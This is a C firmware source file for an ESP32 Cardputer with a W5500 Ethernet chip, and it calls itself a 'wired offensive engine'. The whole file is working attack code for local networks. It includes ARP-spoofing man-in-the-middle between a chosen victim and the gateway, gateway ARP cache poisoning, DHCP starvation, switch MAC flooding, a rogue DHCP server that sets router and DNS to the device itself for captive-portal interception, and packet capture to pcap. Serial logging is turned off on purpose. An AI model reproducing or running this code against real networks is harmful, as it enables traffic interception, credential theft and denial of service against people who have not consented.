// nucleo_eth — wired offensive engine. See nucleo_eth.h for purpose, scope and the one-op discipline.
// Privacy: no serial logging from the offensive stack (matches nucleo_wifiatk / nucleo_w5500).
#define LOG_LOCAL_LEVEL ESP_LOG_NONE
#include "nucleo_eth.h"
#include "nucleo_w5500.h"
#include "eth_frames.h"
#include "nucleo_board.h"

#include <string.h>
#include <stdio.h>
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "driver/spi_common.h"   // SPI2_HOST enum used via NUCLEO_SD_SPI_HOST
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB) — the engine OWNS it for the op's whole
                                // life (like nucleo_wifiatk), so a loud attack survives leaving the app
                                // without the OS services coming back to starve the heap.

// Chip-select GPIO for the W5500. There is no spare pin on the Cardputer's Grove port (only G1/G2,
// and G2 is the keyboard), so the module shares the microSD SPI bus and takes a CS the operator wires
// in. Default G1 (the one free Grove pin); override at build time if you solder it elsewhere.
#ifndef NUCLEO_ETH_CS_PIN
#define NUCLEO_ETH_CS_PIN   1
#endif
#ifndef NUCLEO_ETH_RST_PIN
#define NUCLEO_ETH_RST_PIN  (-1)
#endif

// ---- state ------------------------------------------------------------------
static volatile nucleo_eth_op_t s_op = ETH_OP_NONE;
static volatile bool   s_run;
static TaskHandle_t    s_task;
static portMUX_TYPE    s_lock = portMUX_INITIALIZER_UNLOCKED;

static uint8_t  s_mac[6];
static char     s_mac_str[18];
static bool     s_has_id;
static uint32_t s_ip, s_mask, s_gw, s_dns;

static eth_hostlist_t s_hosts;

static int64_t  s_t0_us;
static volatile unsigned long s_tx, s_rx;
static volatile int           s_scan_prog;
static volatile unsigned long s_pcap_bytes;
static volatile int           s_rogue_leases;
// link/version are cached so the UI task can read them WITHOUT touching the SPI bus the worker owns
// (concurrent SPI from two tasks would corrupt the shared transfer + scratch). Worker refreshes s_link.
static volatile bool          s_link;
static volatile uint8_t       s_ver;

static uint32_t s_victim_ip, s_target_gw;     // op params (MITM/POISON)
static char     s_pcap_path[96];
static FILE    *s_pcap;
static uint32_t s_rogue_next;                  // rolling rogue-lease address offset

static uint8_t  s_txf[ETH_FRAME_MAX];
static uint8_t  s_rxf[ETH_FRAME_MAX];

static uint32_t rng(void) { return esp_random(); }
static int64_t  now_us(void) { return esp_timer_get_time(); }

// ---- discovered-host helpers (locked) ---------------------------------------
static void host_seen(uint32_t ip, const uint8_t mac[6])
{
    bool added; int idx;
    taskENTER_CRITICAL(&s_lock);
    idx = eth_hostlist_upsert(&s_hosts, ip, mac, (uint32_t)(now_us() / 1000), &added);
    if (idx >= 0) s_hosts.h[idx].is_gateway = (ip == s_gw && s_has_id);
    taskEXIT_CRITICAL(&s_lock);
}
static bool host_mac_of(uint32_t ip, uint8_t out[6])
{
    bool found = false;
    taskENTER_CRITICAL(&s_lock);
    for (int i = 0; i < s_hosts.n; i++) if (s_hosts.h[i].ip == ip) { memcpy(out, s_hosts.h[i].mac, 6); found = true; break; }
    taskEXIT_CRITICAL(&s_lock);
    return found;
}

// Pull every pending RX frame; learn ARP senders; count; returns frames drained.
static int drain_arp(void)
{
    int got = 0;
    s_link = w5500_link();   // worker-context SPI is safe; refreshes the UI's cached link state
    for (int guard = 0; guard < 64; guard++) {
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n <= 0) break;
        s_rx++; got++;
        eth_arp_t a;
        if (eth_parse_arp(s_rxf, (size_t)n, &a)) {
            if (!eth_mac_is_zero(a.sender_mac) && a.sender_ip) host_seen(a.sender_ip, a.sender_mac);
        }
    }
    return got;
}

// ---- DHCP bootstrap: a TCP/IP-stack-free mini client to self-configure ------
static bool wait_dhcp(uint8_t want_type, uint32_t xid, eth_dhcp_t *out, int timeout_ms)
{
    int64_t deadline = now_us() + (int64_t)timeout_ms * 1000;
    while (s_run && now_us() < deadline) {
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n > 0) {
            s_rx++;
            eth_dhcp_t d;
            if (eth_parse_dhcp(s_rxf, (size_t)n, &d) && d.msg_type == want_type && d.xid == xid) { *out = d; return true; }
            eth_arp_t a;
            if (eth_parse_arp(s_rxf, (size_t)n, &a) && a.sender_ip) host_seen(a.sender_ip, a.sender_mac);
        } else {
            vTaskDelay(pdMS_TO_TICKS(5));
        }
    }
    return false;
}

static void infer_subnet_passively(int listen_ms)
{
    // No DHCP answer: listen briefly and infer a /24 from the first host we hear, taking a high host
    // address for ourselves and assuming the gateway at .1. Best-effort so a static LAN is still scannable.
    int64_t deadline = now_us() + (int64_t)listen_ms * 1000;
    while (s_run && now_us() < deadline) {
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n <= 0) { vTaskDelay(pdMS_TO_TICKS(5)); continue; }
        s_rx++;
        eth_arp_t a;
        if (eth_parse_arp(s_rxf, (size_t)n, &a) && a.sender_ip) {
            uint32_t net = a.sender_ip & 0xFFFFFF00u;
            s_mask = 0xFFFFFF00u; s_gw = net | 1u; s_ip = net | 0xFAu; s_dns = s_gw; s_has_id = true;
            w5500_set_l3(s_ip, s_mask, s_gw);
            return;
        }
    }
}

static void bootstrap_identity(void)
{
    if (s_has_id) return;
    uint32_t xid = rng();
    size_t len = eth_build_dhcp_discover(s_txf, s_mac, xid);
    w5500_send(s_txf, len); s_tx++;
    eth_dhcp_t off;
    if (wait_dhcp(DHCP_OFFER, xid, &off, 2500)) {
        len = eth_build_dhcp_request(s_txf, s_mac, xid, off.yiaddr, off.server_id ? off.server_id : off.router);
        w5500_send(s_txf, len); s_tx++;
        eth_dhcp_t ack;
        if (wait_dhcp(DHCP_ACK, xid, &ack, 2500)) {
            s_ip   = ack.yiaddr ? ack.yiaddr : off.yiaddr;
            s_mask = ack.netmask ? ack.netmask : (off.netmask ? off.netmask : 0xFFFFFF00u);
            s_gw   = ack.router  ? ack.router  : off.router;
            s_dns  = ack.dns     ? ack.dns     : off.dns;
            if (!s_gw) s_gw = (s_ip & s_mask) | 1u;
            s_has_id = true;
            w5500_set_l3(s_ip, s_mask, s_gw);
            return;
        }
    }
    infer_subnet_passively(1800);
}

// ---- operations -------------------------------------------------------------
static void op_scan(void)
{
    if (!s_has_id) bootstrap_identity();
    if (!s_has_id) { s_scan_prog = 100; return; }

    taskENTER_CRITICAL(&s_lock); eth_hostlist_clear(&s_hosts); taskEXIT_CRITICAL(&s_lock);

    uint32_t total = eth_subnet_size(s_mask);
    if (total > 254) total = 254;             // cap a sweep to a /24-ish range (sane on a Cardputer)
    uint32_t ip = eth_subnet_first_host(s_ip, s_mask);
    uint32_t done = 0;
    while (s_run && ip && done < total) {
        if (ip != s_ip) {
            size_t len = eth_build_arp(s_txf, ARP_OP_REQUEST, ETH_BCAST, s_mac, s_ip, ETH_ZERO, ip);
            if (w5500_send(s_txf, len) > 0) s_tx++;
        }
        drain_arp();
        esp_rom_delay_us(1500);               // pace the sweep so the RX buffer keeps up
        ip = eth_subnet_next_host(ip, s_ip, s_mask);
        done++;
        s_scan_prog = total ? (int)(done * 100 / total) : 100;
    }
    // Always include the gateway as a known host (re-ARP it explicitly).
    if (s_gw) {
        size_t len = eth_build_arp(s_txf, ARP_OP_REQUEST, ETH_BCAST, s_mac, s_ip, ETH_ZERO, s_gw);
        if (w5500_send(s_txf, len) > 0) s_tx++;
    }
    for (int i = 0; i < 240 && s_run; i++) { drain_arp(); vTaskDelay(pdMS_TO_TICKS(5)); }  // collect late replies
    s_scan_prog = 100;
}

static void op_mitm(void)
{
    uint8_t victim_mac[6], gw_mac[6];
    bool hv = host_mac_of(s_victim_ip, victim_mac);
    bool hg = host_mac_of(s_target_gw, gw_mac);
    if (!hv || !hg) return;                   // need both real MACs (selected from a scan) to spoof+heal cleanly

    while (s_run) {
        // Tell the victim: <gateway_ip> is at OUR MAC.
        size_t l1 = eth_build_arp(s_txf, ARP_OP_REPLY, victim_mac, s_mac, s_target_gw, victim_mac, s_victim_ip);
        if (w5500_send(s_txf, l1) > 0) s_tx++;
        // Tell the gateway: <victim_ip> is at OUR MAC.
        size_t l2 = eth_build_arp(s_txf, ARP_OP_REPLY, gw_mac, s_mac, s_victim_ip, gw_mac, s_target_gw);
        if (w5500_send(s_txf, l2) > 0) s_tx++;
        for (int i = 0; i < 40 && s_run; i++) { drain_arp(); vTaskDelay(pdMS_TO_TICKS(50)); }  // re-poison ~2s
    }
    // HEAL: restore the real mappings in both caches (the reversibility Bruce lacks).
    for (int k = 0; k < 5; k++) {
        size_t h1 = eth_build_arp(s_txf, ARP_OP_REPLY, victim_mac, gw_mac, s_target_gw, victim_mac, s_victim_ip);
        w5500_send(s_txf, h1);
        size_t h2 = eth_build_arp(s_txf, ARP_OP_REPLY, gw_mac, victim_mac, s_victim_ip, gw_mac, s_target_gw);
        w5500_send(s_txf, h2);
        vTaskDelay(pdMS_TO_TICKS(40));
    }
}

static void op_poison(void)
{
    while (s_run) {
        uint8_t fake[6]; eth_rand_mac(fake, rng);
        // Gratuitous ARP to everyone: "<gateway_ip> is at <random mac>" -> caches point nowhere = chaos.
        size_t l = eth_build_arp(s_txf, ARP_OP_REPLY, ETH_BCAST, fake, s_target_gw, ETH_BCAST, s_target_gw);
        if (w5500_send(s_txf, l) > 0) s_tx++;
        for (int i = 0; i < 1 && s_run; i++) drain_arp();
        vTaskDelay(pdMS_TO_TICKS(40));
    }
    // HEAL: if we learned the gateway's real MAC, broadcast the correct mapping a few times.
    uint8_t gw_mac[6];
    if (host_mac_of(s_target_gw, gw_mac)) {
        for (int k = 0; k < 6; k++) {
            size_t h = eth_build_arp(s_txf, ARP_OP_REPLY, ETH_BCAST, gw_mac, s_target_gw, ETH_BCAST, s_target_gw);
            w5500_send(s_txf, h);
            vTaskDelay(pdMS_TO_TICKS(40));
        }
    }
}

static void op_dhcp_starve(void)
{
    while (s_run) {
        s_link = w5500_link();
        uint8_t ch[6]; eth_rand_mac(ch, rng);
        uint32_t xid = rng();
        size_t l = eth_build_dhcp_discover(s_txf, ch, xid);
        if (w5500_send(s_txf, l) > 0) s_tx++;
        // Opportunistically lock any offered lease by completing the handshake.
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n > 0) {
            s_rx++;
            eth_dhcp_t d;
            if (eth_parse_dhcp(s_rxf, (size_t)n, &d) && d.msg_type == DHCP_OFFER && d.yiaddr) {
                size_t r = eth_build_dhcp_request(s_txf, d.chaddr, d.xid, d.yiaddr, d.server_id);
                if (w5500_send(s_txf, r) > 0) s_tx++;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(15));
    }
}

static void op_macflood(void)
{
    while (s_run) {
        s_link = w5500_link();
        // Burst random-source frames to overflow the switch's CAM table (fail-open -> acts like a hub).
        for (int b = 0; b < 8 && s_run; b++) {
            uint8_t src[6], dst[6]; eth_rand_mac(src, rng); eth_rand_mac(dst, rng);
            uint32_t a_ip = rng(), b_ip = rng();
            size_t l = eth_build_arp(s_txf, ARP_OP_REQUEST, dst, src, a_ip, ETH_ZERO, b_ip);
            if (w5500_send(s_txf, l) > 0) s_tx++;
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}

static void op_rogue_dhcp(void)
{
    uint32_t net = s_ip & s_mask;
    if (s_rogue_next < 2) s_rogue_next = 100;     // hand out net|.100 upward
    while (s_run) {
        s_link = w5500_link();
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n <= 0) { vTaskDelay(pdMS_TO_TICKS(5)); continue; }
        s_rx++;
        eth_dhcp_t d;
        if (!eth_parse_dhcp(s_rxf, (size_t)n, &d)) continue;
        if (d.msg_type != DHCP_DISCOVER && d.msg_type != DHCP_REQUEST) continue;
        uint32_t yi = net | (s_rogue_next & 0xFF);
        if ((yi & 0xFF) < 2 || yi == s_ip || yi == s_gw) { s_rogue_next++; yi = net | (s_rogue_next & 0xFF); }
        uint8_t type = (d.msg_type == DHCP_DISCOVER) ? DHCP_OFFER : DHCP_ACK;
        // Redirect router AND DNS to ourselves (s_ip) — the MITM hook for a captive/Evil-Portal flow.
        size_t l = eth_build_dhcp_reply(s_txf, type, d.chaddr, d.xid, yi, s_ip,
                                        s_mask ? s_mask : 0xFFFFFF00u, s_ip, s_ip, 3600, s_mac);
        if (w5500_send(s_txf, l) > 0) { s_tx++; if (type == DHCP_ACK) { s_rogue_leases++; s_rogue_next++; } }
    }
}

// ---- PCAP (libpcap classic format, little-endian) ---------------------------
static void pcap_write_le32(uint32_t v) { uint8_t b[4]={(uint8_t)v,(uint8_t)(v>>8),(uint8_t)(v>>16),(uint8_t)(v>>24)}; fwrite(b,1,4,s_pcap); }
static void pcap_write_le16(uint16_t v) { uint8_t b[2]={(uint8_t)v,(uint8_t)(v>>8)}; fwrite(b,1,2,s_pcap); }
static void op_pcap(void)
{
    s_pcap = fopen(s_pcap_path, "wb");
    if (!s_pcap) return;
    pcap_write_le32(0xA1B2C3D4); pcap_write_le16(2); pcap_write_le16(4);   // magic + version 2.4
    pcap_write_le32(0); pcap_write_le32(0);                                // thiszone, sigfigs
    pcap_write_le32(65535); pcap_write_le32(1);                            // snaplen, LINKTYPE_ETHERNET
    s_pcap_bytes = 24;
    int since_flush = 0;
    while (s_run) {
        int n = w5500_recv(s_rxf, sizeof s_rxf);
        if (n <= 0) { vTaskDelay(pdMS_TO_TICKS(4)); continue; }
        s_rx++;
        int64_t t = now_us();
        pcap_write_le32((uint32_t)(t / 1000000)); pcap_write_le32((uint32_t)(t % 1000000));
        pcap_write_le32((uint32_t)n); pcap_write_le32((uint32_t)n);
        fwrite(s_rxf, 1, (size_t)n, s_pcap);
        s_pcap_bytes += 16 + (unsigned long)n;
        if (++since_flush >= 32) { fflush(s_pcap); since_flush = 0; }
        // learn hosts while we're at it
        eth_arp_t a; if (eth_parse_arp(s_rxf, (size_t)n, &a) && a.sender_ip) host_seen(a.sender_ip, a.sender_mac);
    }
    if (s_pcap) { fclose(s_pcap); s_pcap = NULL; }
}

// ---- worker dispatch --------------------------------------------------------
static void worker(void *arg)
{
    (void)arg;
    switch (s_op) {
        case ETH_OP_SCAN:        op_scan();        break;
        case ETH_OP_MITM:        op_mitm();        break;
        case ETH_OP_POISON:      op_poison();      break;
        case ETH_OP_DHCP_STARVE: op_dhcp_starve(); break;
        case ETH_OP_MACFLOOD:    op_macflood();    break;
        case ETH_OP_ROGUE_DHCP:  op_rogue_dhcp();  break;
        case ETH_OP_PCAP:        op_pcap();        break;
        default: break;
    }
    if (s_op == ETH_OP_SCAN) s_op = ETH_OP_NONE;   // scan is one-shot; results stay cached
    s_run = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

static int start_op(nucleo_eth_op_t op)
{
    if (!nucleo_eth_present()) return -1;
    nucleo_eth_stop();                              // heal + free any previous op first (releases exclusive)
    nucleo_exclusive_enter(NX_NET_APP, NULL);       // claim ~70KB for the op's whole life
    s_op = op; s_run = true;
    s_t0_us = now_us(); s_tx = 0; s_rx = 0; s_scan_prog = 0; s_pcap_bytes = 0; s_rogue_leases = 0;
    if (xTaskCreate(worker, "ethatk", 6144, NULL, 5, &s_task) != pdPASS) {   // headroom for FATFS in op_pcap
        s_op = ETH_OP_NONE; s_run = false; nucleo_exclusive_exit(); return -1;
    }
    return 0;
}

// ---- public lifecycle -------------------------------------------------------
bool nucleo_eth_begin(void)
{
    eth_rand_mac(s_mac, rng);
    eth_mac_str(s_mac, s_mac_str, sizeof s_mac_str);
    s_has_id = false; s_ip = s_mask = s_gw = s_dns = 0;
    taskENTER_CRITICAL(&s_lock); eth_hostlist_clear(&s_hosts); taskEXIT_CRITICAL(&s_lock);

    w5500_cfg_t cfg = {0};
    cfg.spi_host = NUCLEO_SD_SPI_HOST;
    cfg.pin_sclk = NUCLEO_SD_PIN_SCLK;     // passing the SD pins: begin() no-ops if the SD already inited the bus
    cfg.pin_miso = NUCLEO_SD_PIN_MISO;
    cfg.pin_mosi = NUCLEO_SD_PIN_MOSI;
    cfg.pin_cs   = NUCLEO_ETH_CS_PIN;
    cfg.pin_rst  = NUCLEO_ETH_RST_PIN;
    cfg.clock_hz = 16 * 1000 * 1000;
    memcpy(cfg.mac, s_mac, 6);
    bool ok = w5500_begin(&cfg);
    s_ver  = ok ? w5500_version() : 0;     // cache for the UI (no SPI from the UI task while running)
    s_link = ok ? w5500_link()    : false;
    return ok;
}

void nucleo_eth_end(void)
{
    nucleo_eth_stop();
    w5500_end();
}

bool        nucleo_eth_present(void)      { return w5500_present(); }
bool        nucleo_eth_link(void)         { return s_link; }   // cached: never SPI from the UI task
uint8_t     nucleo_eth_chip_version(void) { return s_ver; }
const char *nucleo_eth_my_mac_str(void)   { return s_mac_str; }

bool        nucleo_eth_has_identity(void) { return s_has_id; }
uint32_t    nucleo_eth_my_ip(void)        { return s_ip; }
uint32_t    nucleo_eth_gateway_ip(void)   { return s_gw; }
static char s_ipb[16], s_mkb[16], s_gwb[16];
const char *nucleo_eth_my_ip_str(void)    { return s_has_id ? eth_ip_str(s_ip, s_ipb, sizeof s_ipb) : "—"; }
const char *nucleo_eth_netmask_str(void)  { return s_has_id ? eth_ip_str(s_mask, s_mkb, sizeof s_mkb) : "—"; }
const char *nucleo_eth_gateway_str(void)  { return s_has_id ? eth_ip_str(s_gw, s_gwb, sizeof s_gwb) : "—"; }

// ---- public ops -------------------------------------------------------------
int nucleo_eth_scan_start(void)        { return start_op(ETH_OP_SCAN); }
int nucleo_eth_poison_start(uint32_t gateway_ip) { s_target_gw = gateway_ip; return start_op(ETH_OP_POISON); }
int nucleo_eth_dhcp_starve_start(void) { return start_op(ETH_OP_DHCP_STARVE); }
int nucleo_eth_macflood_start(void)    { return start_op(ETH_OP_MACFLOOD); }
int nucleo_eth_rogue_dhcp_start(void)  { if (!s_has_id) return -1; return start_op(ETH_OP_ROGUE_DHCP); }
int nucleo_eth_mitm_start(uint32_t victim_ip, uint32_t gateway_ip)
{
    s_victim_ip = victim_ip; s_target_gw = gateway_ip;
    return start_op(ETH_OP_MITM);
}
int nucleo_eth_pcap_start(const char *sd_path)
{
    snprintf(s_pcap_path, sizeof s_pcap_path, "%s", sd_path ? sd_path : NUCLEO_SD_MOUNT "/capture.pcap");
    return start_op(ETH_OP_PCAP);
}

void nucleo_eth_stop(void)
{
    if (s_op != ETH_OP_NONE || s_task) {
        s_run = false;
        for (int i = 0; i < 200 && s_task; i++) vTaskDelay(pdMS_TO_TICKS(5));   // join (op heals before exit)
        if (s_pcap) { fclose(s_pcap); s_pcap = NULL; }
        s_op = ETH_OP_NONE;
    }
    nucleo_exclusive_exit();   // always release the reclaim (safe/no-op if not active)
}

// ---- public status ----------------------------------------------------------
nucleo_eth_op_t nucleo_eth_current(void)   { return s_op; }
unsigned        nucleo_eth_uptime_s(void)  { return s_op == ETH_OP_NONE ? 0 : (unsigned)((now_us() - s_t0_us) / 1000000); }
unsigned long   nucleo_eth_tx_frames(void) { return s_tx; }
unsigned long   nucleo_eth_rx_frames(void) { return s_rx; }
int             nucleo_eth_scan_progress(void) { return s_scan_prog; }
unsigned long   nucleo_eth_pcap_bytes(void){ return s_pcap_bytes; }
int             nucleo_eth_rogue_leases(void) { return s_rogue_leases; }

int nucleo_eth_host_count(void) { return s_hosts.n; }
static char s_hib[16], s_hmb[18];
const char *nucleo_eth_host_ip(int i)  { if (i<0||i>=s_hosts.n) return ""; return eth_ip_str(s_hosts.h[i].ip, s_hib, sizeof s_hib); }
const char *nucleo_eth_host_mac(int i) { if (i<0||i>=s_hosts.n) return ""; return eth_mac_str(s_hosts.h[i].mac, s_hmb, sizeof s_hmb); }
const char *nucleo_eth_host_vendor(int i){ if (i<0||i>=s_hosts.n) return ""; return eth_oui_vendor(s_hosts.h[i].mac); }
bool        nucleo_eth_host_is_gateway(int i){ if (i<0||i>=s_hosts.n) return false; return s_hosts.h[i].is_gateway; }
uint32_t    nucleo_eth_host_ip_raw(int i){ if (i<0||i>=s_hosts.n) return 0; return s_hosts.h[i].ip; }
